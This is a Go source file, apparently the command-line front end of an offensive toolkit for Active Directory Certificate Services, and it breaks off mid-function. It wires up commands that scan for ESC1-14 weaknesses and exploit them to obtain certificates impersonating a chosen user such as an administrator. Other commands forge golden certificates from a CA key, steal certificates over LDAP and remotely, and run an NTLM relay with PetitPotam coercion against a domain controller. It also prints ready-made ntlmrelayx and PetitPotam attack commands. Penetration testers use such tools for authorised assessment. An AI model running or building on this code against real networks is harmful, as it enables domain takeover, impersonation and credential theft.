package main

import (
	"context"
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/loudmumble/trusted/pkg/pki"
	"github.com/spf13/cobra"
)

// esc <n> — exploit ESC vulnerabilities 1-14
var escCmd = &cobra.Command{
	Use:   "esc <n>",
	Short: "Exploit ESC vulnerability (1-14)",
	Long: `Exploit ADCS ESC vulnerabilities: certificate enrollment, relay attacks, ACL abuse, and more.

Examples:
  trusted esc 1 -t Vuln -U admin@corp.local -d corp.local -dc dc01
  ted esc 7 -ca CorpCA -U admin@corp.local
  ted esc 8 -t Machine -l 10.0.0.5 -d corp.local -dc dc01
  ted esc 11 -t Machine -U admin@corp.local -l 10.0.0.5`,
	Args: cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		return runExploit(cmd, args[0])
	},
}

// enum — enumerate ADCS certificate templates
var enumCmd = &cobra.Command{
	Use:   "enum",
	Short: "Enumerate ADCS certificate templates and ESC vulnerabilities",
	Long: `Enumerate all certificate templates, CA objects, and scan for ESC1-ESC14 vulnerabilities.

Examples:
  trusted enum -d corp.local -dc dc01 -u user -p pass
  ted enum -d corp.local -dc dc01 -u user -H <hash> -L
  ted enum -d corp.local -dc dc01 -u user -p pass -j -s`,
	Args: cobra.NoArgs,
	RunE: func(cmd *cobra.Command, args []string) error {
		return runEnumerate(cmd)
	},
}

// forge — forge golden certificates
var forgeCmd = &cobra.Command{
	Use:   "forge",
	Short: "Forge golden certificate (self-signed or CA-signed)",
	Long: `Forge a golden certificate. Self-signed by default, or CA-signed with --ca-key and --ca-cert.

Examples:
  trusted forge -U admin@corp.local
  ted forge -U admin@corp.local --ca-key ca.key --ca-cert ca.crt -o admin`,
	Args: cobra.NoArgs,
	RunE: func(cmd *cobra.Command, args []string) error {
		return runForge(cmd)
	},
}

// import <file> — inspect a PKCS12/PFX file
var importCmd = &cobra.Command{
	Use:   "import <pfx-file>",
	Short: "Import and inspect a PKCS12/PFX certificate file",
	Args:  cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		return runImportPFX(cmd, args[0])
	},
}

// report — generate ADCS engagement report
var reportCmd = &cobra.Command{
	Use:   "report",
	Short: "Generate engagement report from full ADCS enumeration",
	Long: `Run a full ADCS enumeration and generate a markdown engagement report.

Examples:
  trusted report -d corp.local -dc dc01 -u user -p pass -o findings.md`,
	Args: cobra.NoArgs,
	RunE: func(cmd *cobra.Command, args []string) error {
		return runReport(cmd)
	},
}

// theft <n> — certificate theft playbook
var theftCmd = &cobra.Command{
	Use:   "theft <n>",
	Short: "Certificate theft playbook (1-5, all, theft4)",
	Long: `Certificate theft guidance and automated extraction (THEFT4).

Examples:
  trusted theft all
  ted theft 4 -d corp.local -dc dc01 -u user -p pass -o certs_out`,
	Args: cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		return runTheft(cmd, args[0])
	},
}

func init() {
	rootCmd.AddCommand(escCmd)
	rootCmd.AddCommand(enumCmd)
	rootCmd.AddCommand(forgeCmd)
	rootCmd.AddCommand(importCmd)
	rootCmd.AddCommand(reportCmd)
	rootCmd.AddCommand(theftCmd)

	// esc flags
	escCmd.Flags().StringP("template", "t", "", "Certificate template name")
	escCmd.Flags().StringP("upn", "U", "", "Target UPN to impersonate")
	escCmd.Flags().StringP("ca", "c", "", "Target CA name (ESC5/7)")
	escCmd.Flags().StringP("adn", "", "", "Attacker DN (ESC9/10)")
	escCmd.Flags().StringP("vdn", "", "", "Victim DN (ESC14)")
	escCmd.Flags().StringP("lip", "l", "", "Listener IP for relay (ESC8/11/12)")
	escCmd.Flags().IntP("lp", "", 0, "Listener port for coercion (>1024 = WebDAV)")
	escCmd.Flags().IntP("rp", "", 8080, "Relay port for NTLM relay")
	escCmd.Flags().IntP("rt", "", 120, "Relay timeout (seconds)")
	escCmd.Flags().StringP("output", "o", "", "Output file path for certificate")
	escCmd.Flags().StringP("pfx-password", "P", "", "PFX password")

	// forge flags
	forgeCmd.Flags().StringP("upn", "U", "", "UPN to embed (required)")
	forgeCmd.Flags().String("ca-key", "", "CA private key PEM (golden cert mode)")
	forgeCmd.Flags().String("ca-cert", "", "CA certificate PEM (golden cert mode)")
	forgeCmd.Flags().StringP("output", "o", "", "Output path prefix")
	forgeCmd.Flags().StringP("pfx-password", "P", "", "PFX password")

	// theft flags
	theftCmd.Flags().StringP("output", "o", "", "Output directory (THEFT4)")

	// enum flags
	enumCmd.Flags().StringP("output", "o", "", "Output path (unused, JSON goes to stdout)")

	// report flags
	reportCmd.Flags().StringP("output", "o", "", "Output file path (default: findings.md)")
	reportCmd.Flags().String("format", "markdown", "Report format (markdown)")

	// import flags
	importCmd.Flags().StringP("pfx-password", "P", "", "PFX password")
}

func buildADCSConfig(cmd *cobra.Command) *pki.ADCSConfig {
	targetDC, _ := cmd.Flags().GetString("dc")
	domain, _ := cmd.Flags().GetString("domain")
	username, _ := cmd.Flags().GetString("username")
	password, _ := cmd.Flags().GetString("password")
	hash, _ := cmd.Flags().GetString("hash")
	useTLS, _ := cmd.Flags().GetBool("ldaps")
	useStartTLS, _ := cmd.Flags().GetBool("start-tls")
	outputJSON, _ := cmd.Flags().GetBool("json")
	stealth, _ := cmd.Flags().GetBool("stealth")
	kerberos, _ := cmd.Flags().GetBool("kerberos")
	ccache, _ := cmd.Flags().GetString("ccache")
	keytabPath, _ := cmd.Flags().GetString("keytab")
	kdcIP, _ := cmd.Flags().GetString("dc-ip")
	timeout, _ := cmd.Flags().GetInt("timeout")

	return &pki.ADCSConfig{
		TargetDC:    targetDC,
		Domain:      domain,
		Username:    username,
		Password:    password,
		Hash:        hash,
		UseTLS:      useTLS,
		UseStartTLS: useStartTLS,
		OutputJSON:  outputJSON,
		Stealth:     stealth,
		Kerberos:    kerberos,
		CCache:      ccache,
		Keytab:      keytabPath,
		KDCIP:       kdcIP,
		Timeout:     timeout,
	}
}

func runEnumerate(cmd *cobra.Command) error {
	cfg := buildADCSConfig(cmd)
	if cfg.TargetDC == "" || cfg.Domain == "" {
		return fmt.Errorf("-dc and -d are required for enumeration")
	}
	if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
		return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or -H <NT_HASH> or -k for Kerberos)")
	}
	ctx := context.Background()
	conn, err := pki.ConnectLDAP(ctx, cfg)
	if err != nil {
		return fmt.Errorf("ldap connect: %w", err)
	}
	defer conn.Close()

	if cfg.OutputJSON {
		result, err := pki.EnumerateAll(ctx, cfg, conn)
		if err != nil {
			return fmt.Errorf("enumeration failed: %w", err)
		}
		data, err := json.MarshalIndent(result, "", "  ")
		if err != nil {
			return fmt.Errorf("marshal JSON: %w", err)
		}
		fmt.Println(string(data))
		return nil
	}

	templates, err := pki.EnumerateTemplates(ctx, cfg, conn)
	if err != nil {
		return fmt.Errorf("enumeration failed: %w", err)
	}

	fmt.Printf("\n[+] Found %d certificate templates:\n\n", len(templates))
	for i, tmpl := range templates {
		vulns := "none"
		if len(tmpl.ESCVulns) > 0 {
			vulns = strings.Join(tmpl.ESCVulns, ", ")
		}
		fmt.Printf("  %d. %-30s  ESC: %-20s  Score: %d\n", i+1, tmpl.Name, vulns, tmpl.ESCScore)
		if tmpl.EnrolleeSuppliesSubject {
			fmt.Println("     ⚠  Enrollee Supplies Subject: YES")
		}
		if tmpl.AuthenticationEKU {
			fmt.Println("     ⚠  Authentication EKU: YES")
		}
		if !tmpl.RequiresManagerApproval {
			fmt.Println("     ⚠  Manager Approval: NO")
		}
		for _, f := range tmpl.ESC4Findings {
			fmt.Printf("     ⚠  ESC4: Trustee %s has %s (mask=0x%08x)\n", f.Trustee, strings.Join(f.Rights, ", "), f.AccessMask)
		}
	}

	fmt.Println("\n[*] Scanning for ESC2 (Any Purpose EKU templates)...")
	esc2Findings, err := pki.ScanESC2(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC2 scan failed: %v\n", err)
	} else if len(esc2Findings) == 0 {
		fmt.Println("[+] ESC2: No Any Purpose EKU templates found.")
	} else {
		fmt.Printf("\n[!] ESC2 VULNERABLE — %d finding(s):\n\n", len(esc2Findings))
		for _, f := range esc2Findings {
			fmt.Printf("    Template: %s\n", f.TemplateName)
			fmt.Printf("    EKUs:     %s\n", strings.Join(f.EKUs, ", "))
			fmt.Println()
		}
	}

	fmt.Println("\n[*] Scanning for ESC3 (Enrollment Agent templates)...")
	esc3Findings, err := pki.ScanESC3(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC3 scan failed: %v\n", err)
	} else if len(esc3Findings) == 0 {
		fmt.Println("[+] ESC3: No Enrollment Agent templates found.")
	} else {
		fmt.Printf("\n[!] ESC3 VULNERABLE — %d finding(s):\n\n", len(esc3Findings))
		for _, f := range esc3Findings {
			fmt.Printf("    Template:           %s\n", f.TemplateName)
			fmt.Printf("    Enrollment Agent:   %v\n", f.EnrollmentAgentEKU)
			fmt.Println()
		}
	}

	fmt.Println("\n[*] Scanning CA objects for ESC5 (dangerous ACLs on CA itself)...")
	esc5Findings, err := pki.ScanESC5(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC5 scan failed: %v\n", err)
	} else if len(esc5Findings) == 0 {
		fmt.Println("[+] ESC5: No dangerous CA ACLs found.")
	} else {
		fmt.Printf("\n[!] ESC5 VULNERABLE — %d finding(s):\n\n", len(esc5Findings))
		for _, f := range esc5Findings {
			fmt.Printf("    CA:      %s\n", f.CAName)
			fmt.Printf("    DN:      %s\n", f.CADN)
			fmt.Printf("    Trustee: %s\n", f.Trustee)
			fmt.Printf("    Rights:  %s  (mask=0x%08x)\n", strings.Join(f.Rights, ", "), f.AccessMask)
			fmt.Println()
		}
	}

	fmt.Println("\n[*] Scanning for ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2 on CA)...")
	esc6Findings, err := pki.ScanESC6(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC6 scan failed: %v\n", err)
	} else if len(esc6Findings) == 0 {
		fmt.Println("[+] ESC6: No CAs with EDITF_ATTRIBUTESUBJECTALTNAME2 enabled.")
	} else {
		fmt.Printf("\n[!] ESC6 VULNERABLE — %d finding(s):\n\n", len(esc6Findings))
		for _, f := range esc6Findings {
			fmt.Printf("    CA:        %s\n", f.CAName)
			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
			fmt.Printf("    Flags:     0x%08x\n", f.Flags)
			if len(f.Templates) > 0 {
				fmt.Printf("    Templates: %s\n", strings.Join(f.Templates, ", "))
			}
			fmt.Printf("    > trusted esc 6 -t <ANY> -U <UPN>\n")
			fmt.Println()
		}
	}

	fmt.Println("\n[*] Scanning for ESC7 (vulnerable CA ACLs)...")
	esc7Findings, err := pki.ScanESC7(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC7 scan failed: %v\n", err)
	} else if len(esc7Findings) == 0 {
		fmt.Println("[+] ESC7: No CAs with exploitable ManageCA/ManageCertificates ACLs.")
	} else {
		fmt.Printf("\n[!] ESC7 VULNERABLE — %d finding(s):\n\n", len(esc7Findings))
		for _, f := range esc7Findings {
			fmt.Printf("    CA:                  %s\n", f.CAName)
			fmt.Printf("    Trustee (SID):       %s\n", f.Trustee)
			fmt.Printf("    ManageCA:            %v\n", f.ManageCA)
			fmt.Printf("    ManageCertificates:  %v\n", f.ManageCertificates)
			fmt.Printf("    Access Mask:         0x%08x\n", f.AccessMask)
			fmt.Printf("    > trusted esc 7 -ca %q -U <UPN>\n", f.CAName)
			fmt.Println()
		}
	}

	fmt.Println("\n[*] Scanning for ESC8 (NTLM relay to web enrollment)...")
	esc8Findings, err := pki.ScanESC8(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC8 scan failed: %v\n", err)
	} else if len(esc8Findings) == 0 {
		fmt.Println("[+] ESC8: No vulnerable web enrollment endpoints found.")
	} else {
		fmt.Printf("\n[!] ESC8 VULNERABLE — %d finding(s):\n\n", len(esc8Findings))
		for _, f := range esc8Findings {
			fmt.Printf("    CA:        %s\n", f.CAName)
			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
			fmt.Printf("    Endpoint:  %s\n", f.HTTPEndpoint)
			fmt.Printf("    NTLM:      %v\n", f.NTLMEnabled)
			fmt.Printf("    Templates: %s\n", strings.Join(f.Templates, ", "))
			fmt.Printf("    > ntlmrelayx.py -t %scertfnsh.asp -smb2support --adcs --template <TEMPLATE>\n", f.HTTPEndpoint)
			fmt.Println()
		}
	}

	fmt.Println("\n[*] Scanning for ESC11 (NTLM relay to RPC interface)...")
	esc11Findings, err := pki.ScanESC11(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC11 scan failed: %v\n", err)
	} else if len(esc11Findings) == 0 {
		fmt.Println("[+] ESC11: All CAs enforce RPC encryption.")
	} else {
		fmt.Printf("\n[!] ESC11 VULNERABLE — %d finding(s):\n\n", len(esc11Findings))
		for _, f := range esc11Findings {
			fmt.Printf("    CA:        %s\n", f.CAName)
			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
			fmt.Printf("    Flags:     0x%08x\n", f.Flags)
			fmt.Printf("    Encrypts:  %v\n", f.EnforcesEncryption)
			fmt.Printf("    > trusted esc 11 -t <TEMPLATE> -U <UPN> -l <IP> -dc %s\n", f.CAHostname)
			fmt.Println()
		}
	}

	fmt.Println("\n[*] Scanning for ESC12 (DCOM interface abuse on CA)...")
	esc12Findings, err := pki.ScanESC12(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC12 scan failed: %v\n", err)
	} else if len(esc12Findings) == 0 {
		fmt.Println("[+] ESC12: No CAs with accessible DCOM endpoints found.")
	} else {
		fmt.Printf("\n[!] ESC12 VULNERABLE — %d finding(s):\n\n", len(esc12Findings))
		for _, f := range esc12Findings {
			fmt.Printf("    CA:        %s\n", f.CAName)
			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
			fmt.Printf("    DCOM:      %v\n", f.DCOMAccessible)
			fmt.Printf("    Flags:     0x%08x\n", f.Flags)
			fmt.Printf("    > trusted esc 12 -t <TEMPLATE> -U <UPN> -l <IP> -dc %s\n", f.CAHostname)
			fmt.Println()
		}
	}

	fmt.Println("\n[*] Scanning for ESC9 (CT_FLAG_NO_SECURITY_EXTENSION)...")
	esc9Findings, err := pki.ScanESC9(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC9 scan failed: %v\n", err)
	} else if len(esc9Findings) == 0 {
		fmt.Println("[+] ESC9: No vulnerable templates found.")
	} else {
		fmt.Printf("\n[!] ESC9 VULNERABLE — %d finding(s):\n\n", len(esc9Findings))
		for _, f := range esc9Findings {
			enforcement := "unknown"
			switch f.BindingEnforcement {
			case 0:
				enforcement = "Disabled (EXPLOITABLE)"
			case 1:
				enforcement = "Compatibility mode (EXPLOITABLE)"
			case 2:
				enforcement = "Full enforcement (mitigated)"
			}
			fmt.Printf("    Template:                %s\n", f.TemplateName)
			fmt.Printf("    NO_SECURITY_EXTENSION:   %v\n", f.HasNoSecurityExtension)
			fmt.Printf("    Authentication EKU:      %v\n", f.AuthenticationEKU)
			fmt.Printf("    Binding Enforcement:     %d (%s)\n", f.BindingEnforcement, enforcement)
			fmt.Println()
		}
	}

	fmt.Println("\n[*] Scanning for ESC10 (weak certificate mapping methods)...")
	esc10Findings, err := pki.ScanESC10(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC10 scan failed: %v\n", err)
	} else if len(esc10Findings) == 0 {
		fmt.Println("[+] ESC10: Certificate mapping methods are not weak.")
	} else {
		fmt.Printf("\n[!] ESC10 VULNERABLE — %d finding(s):\n\n", len(esc10Findings))
		for _, f := range esc10Findings {
			enforcement := "unknown"
			switch f.BindingEnforcement {
			case 0:
				enforcement = "Disabled (EXPLOITABLE)"
			case 1:
				enforcement = "Compatibility mode (EXPLOITABLE)"
			case 2:
				enforcement = "Full enforcement (mitigated)"
			}
			fmt.Printf("    Mapping Methods:     0x%02x\n", f.MappingMethods)
			fmt.Printf("    UPN Mapping:         %v\n", f.UPNMappingEnabled)
			fmt.Printf("    S4U2Self Mapping:    %v\n", f.S4U2SelfEnabled)
			fmt.Printf("    Binding Enforcement: %d (%s)\n", f.BindingEnforcement, enforcement)
			fmt.Printf("    Vulnerable Templates (%d): %s\n", len(f.VulnerableTemplates), strings.Join(f.VulnerableTemplates, ", "))
			fmt.Println()
		}
	}

	fmt.Println("\n[*] Scanning for ESC13 (OID group link abuse)...")
	esc13Findings, err := pki.ScanESC13(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC13 scan failed: %v\n", err)
	} else if len(esc13Findings) == 0 {
		fmt.Println("[+] ESC13: No linked issuance policy OIDs found.")
	} else {
		fmt.Printf("\n[!] ESC13 VULNERABLE — %d finding(s):\n\n", len(esc13Findings))
		for _, f := range esc13Findings {
			fmt.Printf("    Template:     %s\n", f.TemplateName)
			fmt.Printf("    Policy OID:   %s\n", f.IssuancePolicyOID)
			fmt.Printf("    Linked Group: %s (%s)\n", f.LinkedGroupName, f.LinkedGroup)
			fmt.Println()
		}
	}

	fmt.Println("\n[*] Scanning for ESC14 (weak explicit mappings via altSecurityIdentities)...")
	esc14Findings, err := pki.ScanESC14(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] ESC14 scan failed: %v\n", err)
	} else if len(esc14Findings) == 0 {
		fmt.Println("[+] ESC14: No schema v1 templates with weak mapping found.")
	} else {
		fmt.Printf("\n[!] ESC14 VULNERABLE — %d finding(s):\n\n", len(esc14Findings))
		for _, f := range esc14Findings {
			enforcement := "unknown"
			switch f.BindingEnforcement {
			case 0:
				enforcement = "Disabled (EXPLOITABLE)"
			case 1:
				enforcement = "Compatibility mode (EXPLOITABLE)"
			case 2:
				enforcement = "Full enforcement (mitigated)"
			}
			fmt.Printf("    Template:            %s\n", f.TemplateName)
			fmt.Printf("    Schema Version:      %d\n", f.SchemaVersion)
			fmt.Printf("    Explicit Mapping:    %v\n", f.AllowsExplicitMapping)
			fmt.Printf("    Strong Mapping Req:  %v\n", f.StrongMappingRequired)
			fmt.Printf("    Binding Enforcement: %d (%s)\n", f.BindingEnforcement, enforcement)
			fmt.Println()
		}
	}

	return nil
}

func runForge(cmd *cobra.Command) error {
	upn, _ := cmd.Flags().GetString("upn")
	caKeyPath, _ := cmd.Flags().GetString("ca-key")
	caCertPath, _ := cmd.Flags().GetString("ca-cert")
	output, _ := cmd.Flags().GetString("output")

	if upn == "" {
		return fmt.Errorf("-U is required for certificate forging (e.g. -U administrator@corp.local)")
	}
	if !strings.Contains(upn, "@") {
		return fmt.Errorf("-U must be a full UPN (user@domain), got %q", upn)
	}
	if output == "" {
		if idx := strings.Index(upn, "@"); idx > 0 {
			output = upn[:idx]
		} else {
			output = upn
		}
	}

	basePath := output
	for _, ext := range []string{".pem", ".crt", ".key", ".pfx"} {
		basePath = strings.TrimSuffix(basePath, ext)
	}

	// Golden Certificate mode: both --ca-key and --ca-cert provided
	if caKeyPath != "" && caCertPath != "" {
		fmt.Println("[!] Golden Certificate mode: signing with real CA key + cert")
		caCert, caKey, err := pki.LoadCACertAndKey(caCertPath, caKeyPath)
		if err != nil {
			return fmt.Errorf("load CA material: %w", err)
		}

		cert, certKey, err := pki.ForgeGoldenCertificate(caKey, caCert, upn)
		if err != nil {
			return fmt.Errorf("forge golden certificate: %w", err)
		}

		if err := pki.WriteCertKeyPEM(cert, certKey, basePath); err != nil {
			return fmt.Errorf("write certificate: %w", err)
		}
		pfxPassword, _ := cmd.Flags().GetString("pfx-password")
		if err := pki.WritePFX(cert, certKey, basePath+".pfx", pfxPassword); err != nil {
			return fmt.Errorf("PFX export failed: %w", err)
		}

		outputJSON, _ := cmd.Flags().GetBool("json")
		if outputJSON {
			data, _ := json.MarshalIndent(map[string]string{
				"type":      "golden_certificate",
				"subject":   cert.Subject.CommonName,
				"issuer":    cert.Issuer.CommonName,
				"upn":       upn,
				"serial":    cert.SerialNumber.Text(16),
				"cert_path": basePath + ".crt",
				"key_path":  basePath + ".key",
				"pfx_path":  basePath + ".pfx",
			}, "", "  ")
			fmt.Println(string(data))
			return nil
		}
		fmt.Printf("[+] Golden certificate (CA-signed) written to %s.crt / %s.pfx\n", basePath, basePath)
		fmt.Printf("    Subject: %s\n", cert.Subject.CommonName)
		fmt.Printf("    Issuer:  %s\n", cert.Issuer.CommonName)
		fmt.Printf("    UPN: %s\n", upn)
		fmt.Printf("    Serial: %s\n", cert.SerialNumber.Text(16))
		fmt.Printf("    Valid: %s to %s\n", cert.NotBefore.Format("2006-01-02"), cert.NotAfter.Format("2006-01-02"))
		return nil
	}

	// Self-signed mode
	var caKey crypto.PrivateKey

	if caKeyPath != "" {
		data, err := os.ReadFile(caKeyPath)
		if err != nil {
			return fmt.Errorf("read CA key: %w", err)
		}
		block, _ := pem.Decode(data)
		if block == nil {
			return fmt.Errorf("no PEM block found in %s", caKeyPath)
		}
		pkcs8Key, err := x509.ParsePKCS8PrivateKey(block.Bytes)
		if err == nil {
			caKey = pkcs8Key
		} else {
			rsaKey, rsaErr := x509.ParsePKCS1PrivateKey(block.Bytes)
			if rsaErr == nil {
				caKey = rsaKey
			} else {
				ecKey, ecErr := x509.ParseECPrivateKey(block.Bytes)
				if ecErr != nil {
					return fmt.Errorf("parse CA key: PKCS8: %v, PKCS1: %v, EC: %v", err, rsaErr, ecErr)
				}
				caKey = ecKey
			}
		}
	} else {
		fmt.Println("[*] No --ca-key provided, generating ephemeral RSA key...")
		rsaKey, err := rsa.GenerateKey(rand.Reader, 2048)
		if err != nil {
			return fmt.Errorf("generate CA key: %w", err)
		}
		caKey = rsaKey
	}

	cert, certKey, err := pki.ForgeCertificate(caKey, upn)
	if err != nil {
		return fmt.Errorf("forge certificate: %w", err)
	}

	if err := pki.WriteCertKeyPEM(cert, certKey, basePath); err != nil {
		return fmt.Errorf("write certificate: %w", err)
	}
	pfxPassword, _ := cmd.Flags().GetString("pfx-password")
	if err := pki.WritePFX(cert, certKey, basePath+".pfx", pfxPassword); err != nil {
		return fmt.Errorf("PFX export failed: %w", err)
	}

	outputJSON, _ := cmd.Flags().GetBool("json")
	if outputJSON {
		data, _ := json.MarshalIndent(map[string]string{
			"type":      "self_signed_certificate",
			"subject":   cert.Subject.CommonName,
			"upn":       upn,
			"serial":    cert.SerialNumber.String(),
			"cert_path": basePath + ".crt",
			"key_path":  basePath + ".key",
			"pfx_path":  basePath + ".pfx",
		}, "", "  ")
		fmt.Println(string(data))
		return nil
	}
	fmt.Printf("[+] Golden certificate written to %s.crt / %s.pfx\n", basePath, basePath)
	fmt.Printf("    Subject: %s\n", cert.Subject.CommonName)
	fmt.Printf("    UPN: %s\n", upn)
	fmt.Printf("    Serial: %s\n", cert.SerialNumber.String())
	fmt.Printf("    Valid: %s to %s\n", cert.NotBefore.Format("2006-01-02"), cert.NotAfter.Format("2006-01-02"))
	return nil
}

func runTheft(cmd *cobra.Command, certTheft string) error {
	cfg := buildADCSConfig(cmd)
	if cfg.TargetDC == "" || cfg.Domain == "" {
		return fmt.Errorf("-dc and -d are required for certificate extraction")
	}
	if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
		return fmt.Errorf("Authentication required: use -u <user> -p <pass> (or -H <NT_HASH> or -k for Kerberos)")
	}

	if strings.EqualFold(certTheft, "theft4") || certTheft == "4" {
		outputDir, _ := cmd.Flags().GetString("output")
		if outputDir == "" {
			outputDir = "ldap_certs"
		}
		certs, err := pki.ExtractUserCertificatesLDAP(cfg, outputDir)
		if cfg.OutputJSON {
			if err != nil {
				data, _ := json.MarshalIndent(map[string]string{"error": err.Error()}, "", "  ")
				fmt.Println(string(data))
				return nil
			}
			data, _ := json.MarshalIndent(certs, "", "  ")
			fmt.Println(string(data))
			return nil
		}
		return err
	}

	method := certTheft
	if len(method) <= 2 && method[0] >= '0' && method[0] <= '9' {
		method = "theft" + method
	}
	err := pki.RemoteCertTheft(cfg.TargetDC, method, cfg)
	if cfg.OutputJSON {
		status := "success"
		if err != nil {
			status = err.Error()
		}
		data, _ := json.MarshalIndent(map[string]string{"method": method, "status": status}, "", "  ")
		fmt.Println(string(data))
		return nil
	}
	return err
}

func runExploit(cmd *cobra.Command, exploit string) error {
	cfg := buildADCSConfig(cmd)
	if cfg.TargetDC == "" || cfg.Domain == "" {
		return fmt.Errorf("-dc and -d are required")
	}
	if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
		return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or -H <NT_HASH> or -k for Kerberos)")
	}
	ctx := context.Background()
	conn, err := pki.ConnectLDAP(ctx, cfg)
	if err != nil {
		return fmt.Errorf("ldap connect: %w", err)
	}
	defer conn.Close()

	templateName, _ := cmd.Flags().GetString("template")
	upn, _ := cmd.Flags().GetString("upn")
	output, _ := cmd.Flags().GetString("output")

	escID := strings.ToLower(strings.TrimPrefix(strings.ToLower(exploit), "esc"))
	isRelayESC := escID == "8" || escID == "11" || escID == "12"
	needsTemplate := escID != "5" && !isRelayESC
	needsUPN := !isRelayESC

	if templateName == "" && needsTemplate {
		return fmt.Errorf("-t (template) is required for exploitation")
	}
	if upn == "" && needsUPN {
		return fmt.Errorf("-U (UPN) is required for exploitation")
	}
	if upn != "" && !strings.Contains(upn, "@") {
		return fmt.Errorf("-U must be a full UPN (user@domain), got %q — try %s@%s", upn, upn, cfg.Domain)
	}
	if output == "" {
		if idx := strings.Index(upn, "@"); idx > 0 {
			output = upn[:idx]
		} else {
			output = upn
		}
	}

	var cert *x509.Certificate
	var certKey crypto.Signer

	switch escID {
	case "1":
		cert, certKey, err = pki.ExploitESC1(ctx, cfg, conn, templateName, upn)
	case "2":
		cert, certKey, err = pki.ExploitESC2(ctx, cfg, conn, templateName, upn)
	case "3":
		cert, certKey, err = pki.ExploitESC3(ctx, cfg, conn, templateName, upn)
	case "4":
		cert, certKey, err = pki.ExploitESC4(ctx, cfg, conn, templateName, upn)
	case "6":
		cert, certKey, err = pki.ExploitESC6(ctx, cfg, conn, templateName, upn)
	case "7":
		caName, _ := cmd.Flags().GetString("ca")
		if caName == "" {
			return fmt.Errorf("-ca is required for ESC7 exploitation")
		}
		cert, certKey, err = pki.ExploitESC7(ctx, cfg, conn, caName, upn)
	case "9":
		attackerDN, _ := cmd.Flags().GetString("adn")
		if attackerDN == "" {
			return fmt.Errorf("--adn is required for ESC9 exploitation")
		}
		cert, certKey, err = pki.ExploitESC9(ctx, cfg, conn, templateName, attackerDN, upn)
	case "13":
		cert, certKey, err = pki.ExploitESC13(ctx, cfg, conn, templateName, upn)
	case "8":
		esc8Findings, scanErr := pki.ScanESC8(ctx, cfg, conn)
		if scanErr != nil {
			return fmt.Errorf("ESC8 scan failed: %w", scanErr)
		}
		if len(esc8Findings) == 0 {
			return fmt.Errorf("no vulnerable web enrollment endpoints found")
		}
		if cfg.OutputJSON {
			data, _ := json.MarshalIndent(esc8Findings, "", "  ")
			fmt.Println(string(data))
			return nil
		}
		target := esc8Findings[0]
		relayPort, _ := cmd.Flags().GetInt("rp")
		if relayPort == 0 {
			relayPort = 8080
		}
		relayTimeout, _ := cmd.Flags().GetInt("rt")
		if relayTimeout == 0 {
			relayTimeout = 120
		}
		fmt.Printf("[*] ESC8: Starting built-in NTLM relay server on :%d\n", relayPort)
		fmt.Printf("[*] Relaying to: %s (%s)\n", target.CAName, target.HTTPEndpoint)
		fmt.Printf("[*] Template: %s\n", templateName)
		fmt.Printf("[*] Timeout: %ds — waiting for coerced NTLM authentication\n\n", relayTimeout)

		listenerIP, _ := cmd.Flags().GetString("lip")
		listenerPort, _ := cmd.Flags().GetInt("lp")
		if listenerIP != "" {
			go func() {
				time.Sleep(2 * time.Second)
				fmt.Printf("[*] Triggering PetitPotam coercion: %s → %s:%d\n", cfg.TargetDC, listenerIP, listenerPort)
				if coerceErr := pki.CoerceNTLMAuth(cfg.TargetDC, listenerIP, listenerPort, pki.CoercePetitPotam, cfg); coerceErr != nil {
					fmt.Printf("[!] PetitPotam coercion failed: %v\n", coerceErr)
				}
			}()
		} else {
			fmt.Println("[*] Awaiting connection — trigger NTLM auth externally:")
			fmt.Printf("    PetitPotam.py <LISTENER_IP> %s\n", cfg.TargetDC)
			fmt.Printf("    Or: PrinterBug.py <LISTENER_IP> %s\n\n", cfg.TargetDC)
		}

		caHostname := target.CAHostname
		if caHostname == "" {
			caHostname = target.CAName
		}
		relayCert, relayKey, relayErr := pki.RunRelayServer(
			caHostname, templateName, upn,
			relayPort, time.Duration(relayTimeout)*time.Second,
		)
		if relayErr != nil {
			return fmt.Errorf("ESC8 relay failed: %w", relayErr)
		}
		cert, certKey = relayCert, relayKey
	case "12":
		esc12Findings, scanErr := pki.ScanESC12(ctx, cfg, conn)
		if scanErr != nil {
			return fmt.Errorf("ESC12 scan failed: %w", scanErr)
		}
		if len(esc12Findings) == 0 {
			return fmt.Errorf("no CAs with accessible DCOM endpoints found")
		}
		if cfg.OutputJSON {
			data, _ := json.MarshalIndent(esc12Findings, "", "  ")
			fmt.Println(string(data))
			return nil
		}
		f := esc12Findings[0]

		listenerIP, _ := cmd.Flags().GetString("lip")
		listenerPort, _ := cmd.Flags().GetInt("lp")
		if listenerIP == "" {
			return fmt.Errorf("-l (listener IP) is required for automated coercion")
		}
		relayPort, _ := cmd.Flags().GetInt("rp")
		relayTimeout, _ := cmd.Flags().GetInt("rt")

